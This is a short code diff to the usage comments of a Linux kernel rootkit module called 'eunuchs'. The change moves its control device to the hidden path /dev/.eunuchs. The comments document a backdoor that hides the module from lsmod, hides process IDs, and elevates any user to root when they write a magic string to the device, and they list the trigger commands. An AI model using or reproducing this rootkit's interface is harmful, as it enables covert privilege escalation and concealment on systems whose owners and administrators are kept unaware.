@@ -27,7 +27,7 @@
  * To unload the module:
  *  `sudo rmmod eunuchs`
  *  NB: The LKM must NOT be hidden in order to remove it.
- *      `echo lemmesee > /dev/eunuchs` to show the module in the loaded module
+ *      `echo lemmesee > /dev/.eunuchs` to show the module in the loaded module
  *      list, so that it may be removed.
  *
  * Credential elevation... (3 ways)
@@ -45,7 +45,7 @@
  *  If the user writes `icanhazr00t?` (NB: you need to properly escape this
  *  string when echo'ing it), that user will be elevated to root.
  *
- * All other interaction with this module is done by writing to /dev/eunuchs.
+ * All other interaction with this module is done by writing to /dev/.eunuchs.
  * Commands:
  *  ohaiplzshowallhiding            - shows all hidden pids (DEBUG ONLY)
  *  kthxbye                         - hide the LKM from lsmod (NOTE: You can't
